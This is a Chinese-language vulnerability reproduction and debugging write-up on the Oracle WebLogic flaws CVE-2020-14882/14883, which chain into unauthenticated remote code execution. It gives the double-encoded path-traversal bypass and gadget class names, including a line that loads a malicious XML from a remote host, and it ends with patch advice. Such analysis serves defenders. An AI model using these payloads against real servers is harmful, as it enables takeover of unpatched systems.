## **一、背景**

###  **漏洞概述**

WebLogic是美国Oracle公司的主要产品之一，是商业市场上主要的 J2EE 应用服务器软件，也是世界上第一个成功商业化的J2EE应用服务器，在
Java 应用服务器中有非常广泛的部署和应用。10月21日，Oracle官方发布数百个组件的高危漏洞公告。其中组合利用CVE-2020-14882/
CVE-2020-14883可使未经授权的攻击者绕过WebLogic后台登录等限制，最终远程执行代码接管WebLogic服务器，利用难度极低，风险极大。此处漏洞均存在于WebLogic的控制台中。该组件为WebLogic全版本自带组件，并且该漏洞通过HTTP协议进行利用，CVE-2020-14882漏洞允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。

###  **漏洞编号**

CVE-2020-14882、CVE-2020-14883

###  **漏洞等级**

高危，CVSS评分9.8

###  **受影响的版本**

10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0

##  **二、复现**

###  **复现环境**

本次测试是用的weblogic
10.3.6.0及weblogic12.2.1.3.0，weblogic12.2.1.4.0![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977123_5faa01e3c1312dda7caa7.png!small)![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977131_5faa01ebdf830e2490d02.png!small)

###  **权限绕过漏洞（CVE-2020-14882）复现：**

在正常访问console后台时会提示输入帐号密码![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977142_5faa01f6d77876b31d231.png!small)对于其他路径也限制了访问，可以看到返回403

通过未授权访问，则可以绕过验证直接访问后台。

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977171_5faa0213cb7670bb605ed.png!small)

可看到通过未授权访问的后台与正常登陆的后台相比，由于权限不足，缺少部署等功能，无法安装应用，所以也无法通过部署项目等方式直接获取权限。

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977181_5faa021de3d3877e9dd7a.png!small)

‘%252E%252E%252F’即为二次URL编码过后的‘../’，通过这个就可以实现穿越路径未授权访问相关管理后台

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977192_5faa022884ec1a15b830c.png!small)

###  **任意代码执行复现**

利用上述未授权访问CVE-2020-14882结合CVE-2020-14883

###  **利用方式（一）**

通过：com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext，这种方法最早在CVE-2019-2725被提出，该方法通用于各版本weblogic。这里首先需要我们构造一个恶意的xml文件，如这里我们自己搭建的http://10.211.55.2:9999/rce-win.xml。其次需要被攻击的weblogic能够访问我们的恶意xml。![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977201_5faa0231a01166d34b0a6.png!small)![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977214_5faa023e3d22f0ed56ab9.png!small)

其他gadget：

com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://IP/poc.xml")

###  **利用方式（二）**

通过com.tangosol.coherence.mvel2.sh.ShellSession，但此利用方法只能在Weblogic
12.2.1及以上版本利用，因为10.3.6并不存在com.tangosol.coherence.mvel2.sh.ShellSession类。

我们可以看到在当前10.3.6版本会提示![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977227_5faa024b8142860e36e5c.png!small)

当使用12版本测试时，即可测试成功

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977236_5faa0254a90d9ed8c469c.png!small)

###  **其他exp**

比如回显的

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977248_5faa026048a9d69367020.png!small)

或者POST形式 ：

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977259_5faa026b0d307fe477e23.png!small)

###  **调试分析**

首先，通过静态资源文件绕过路径权限的校验。之后weblogic会对提交的url进行两次url解码。最后会将handle中的参数传入HandleFactory执行任意代码。

从绕过路径权限的校验开始。首先weblogic的请求会经过weblogic.servlet.internal.WebAppServletContext#execute处理，这里会调用securedExecute()

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977269_5faa027501c679df13834.png!small)

跟进securedExecute，后会调用doSecuredExecute，继续跟进

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977278_5faa027e54cfa67efd829.png!small)

weblogic.servlet.internal.WebAppServletContext#doSecuredExecute

在这里调用checkAccess进行权限的检查

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977286_5faa028610e5e676367bc.png!small)

进入weblogic.servlet.security.internal.WebAppSecurity#checkAccess()中可以看到当我们请求的路径为/console/console.portal时，checkAllResources为false

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977296_5faa029026b3aa4f10a99.png!small)

这里跟进weblogic.servlet.security.internal.WebAppSecurityWLS#getConstraint()

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977305_5faa029909ccd39293b62.png!small)

这里即比较我们的relURI是否匹配我们matchMap中的路径，并判断rcForAllMethods和rcForOneMethod是否为null

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977315_5faa02a3325b3e6dc135f.png!small)

当我们的relURI为/console.portal时，rcForAllMethods不为null，rcForOneMethod为null，所以返回了rcForAllMethods。而对应静态资源就不会有限制和校验

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977325_5faa02ad134378213b440.png!small)

接下来回到checkAccess，如果这里是原来的/console.portal时，到这就结束了

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977334_5faa02b63556643994f45.png!small)

如果使用console/images/console.portal则会继续判断resourceConstraint及后续的isAuthorized，并进入weblogic.servlet.security.internal.ChainedSecurityModule#checkAccess

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977345_5faa02c17958de5a5453a.png!small)

在weblogic.servlet.security.internal.CertSecurityModule#checkUserPerm中会进入hasPermission校验权限

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977356_5faa02cc6f488f9a366ff.png!small)

所以当我们这里使用静态资源路径时，unrestrict值就为true

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977366_5faa02d6d22a0ef860342.png!small)

之后会根据web.xml中的配置对应的AsyncInitServlet来到了weblogic.servlet.AsyncInitServlet#service

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977376_5faa02e0e74465d15e710.png!small)

这里如果解码后的url里没有;，那么就会继续调用super.service

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977386_5faa02ea8eb64e2b4c879.png!small)

再次进入super.service()

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977396_5faa02f4930f2f5764d23.png!small)

最终不管哪种请求都会来到doPost，并在这里调用createUIContext

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977408_5faa0300d2e834d3d86e5.png!small)

可以看到此时已经经过了一次解码

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977419_5faa030be6489d21af05b.png!small)

随后进入getTree又进行了一次解码，此时requestPattern就变成/css/../console.portal

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977428_5faa0314ebcb1a00d2422.png!small)

之后来到com.bea.console.utils.BreadcrumbBacking#init类，进入findFirstHandle

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977457_5faa033103cba6ce601ad.png!small)

这里会逐个检查参数中是否有handle并将handle的参数内容提取出来返回

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977473_5faa034110eddb54317a4.png!small)

最后将获取到的handleStr作为参数调用HandleFactory.getHandle(handleStr);此时也就来到了代码执行的入口

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977485_5faa034dc12009b8becc4.png!small)

此时传进来的handleStr会在这里被拆成两部分，一个作为被实例化的类，另一个作为该类的构造函数参数及实例化，比如java.lang.String('aaaa')，被拆分成java.lang.String和aaaa

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977494_5faa0356e9beb720892f3.png!small)

所以我们就可根据此来构造gadget，最终通过反射机制在此触发

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977504_5faa0360977dc27338c36.png!small)

比如当我们构造了恶意gadget后就变成了这样，随后即可触发rce

![640?wx_fmt=png](https://image.3001.net/images/20201110/1604977514_5faa036a0bf0a3fd9bbe0.png!small)

## 三、修复

目前Oracle官方已发布了最新针对该漏洞的补丁，请受影响用户及时下载补丁程序并安装更新。

Oracle官方补丁需要用户持有正版软件的许可账号，使用该账号登陆https://support.oracle.com后，可以下载最新补丁。

参考链接：https://www.oracle.com/security-alerts/cpuoct2020.html

在旧版补丁中，使用黑名单过滤，可使用大小写绕过，请更新最新版的补丁，或者如无使用必要可选择关闭console。

  

